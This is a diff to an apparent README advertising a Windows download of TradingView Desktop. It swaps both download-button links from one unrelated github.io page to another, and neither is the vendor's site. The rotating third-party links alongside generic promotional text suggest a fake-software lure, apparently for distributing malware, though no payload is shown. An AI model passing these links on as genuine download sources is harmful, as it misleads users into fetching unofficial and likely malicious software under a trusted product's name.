@@ -4,7 +4,7 @@
 
 ## 📥 Download TradingView Desktop for Windows
 
-[![⬇️ Download TradingView Desktop](https://img.shields.io/badge/Download-TradingView%20Desktop-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/224)
+[![⬇️ Download TradingView Desktop](https://img.shields.io/badge/Download-TradingView%20Desktop-blue?style=for-the-badge&logo=windows)](https://viewload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ The desktop version goes beyond standard browser capabilities by allowing multi-
 
 TradingView Desktop also integrates with a wide range of brokers, allowing you to place trades directly from the charts without switching between platforms. Whether you’re a day trader, swing trader, long-term investor, or simply learning market analysis, TradingView Desktop offers the flexibility, precision, and tools needed to stay ahead in the markets.
 
-[![⬇️ Download TradingView Desktop](https://img.shields.io/badge/Download-TradingView%20Desktop-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/224)
+[![⬇️ Download TradingView Desktop](https://img.shields.io/badge/Download-TradingView%20Desktop-blue?style=for-the-badge&logo=windows)](https://viewload.github.io/.github/)
 
 ---
 
